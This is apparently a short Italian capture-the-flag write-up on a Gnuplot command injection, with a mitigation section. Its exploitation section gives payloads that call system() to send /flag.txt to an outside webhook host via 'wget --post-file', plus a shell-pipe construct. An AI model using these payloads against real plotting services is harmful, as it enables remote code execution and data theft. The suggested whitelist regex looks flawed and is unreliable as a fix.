# Plotty Boy — Gnuplot Command Injection

### 1. La Vulnerabilità (In sintesi)
L'applicazione backend passa l'input matematico dell'utente direttamente al comando `plot <INPUT>` del programma **Gnuplot** senza sanitizzazione. Gnuplot è in grado di invocare la shell di sistema (RCE) valutando la funzione `system("comando")`. 
Poiché i grafici vengono restituiti come immagini (Blind), è necessario esfiltrare i dati Out-of-Band (OOB).

### 2. Exploitation (Pratica)

**Soluzione Principale (Esfiltrazione via POST):**
Richiamare `system()` iniettando il comando come titolo o nuova serie del plot. L'uso di `wget --post-file` garantisce l'integrità del payload inviato senza problemi di encoding:
```text
system("wget --post-file /flag.txt https://webhook.site/YOUR-WEBHOOK-ID")
```

**Soluzioni Secondarie (Costrutti Gnuplot):**
Se servono costrutti specifici per innescare l'esecuzione in Gnuplot, usare:
- **Title**: `x**2 title system("wget --post-file /flag.txt https://webhook.site/YOUR-WEBHOOK-ID")`
- **Pipe di Input**: `x**2, "< comando_shell"`

### 3. Mitigazione
Implementare una rigida whitelist (es. solo numeri e operatori matematici `^[0-9x\s\+\-\*\/\^\(\)\.,|sin|cos|tan]+$`) o usare librerie di plot sicure senza dipendenze su eseguibili di sistema (es. matplotlib).
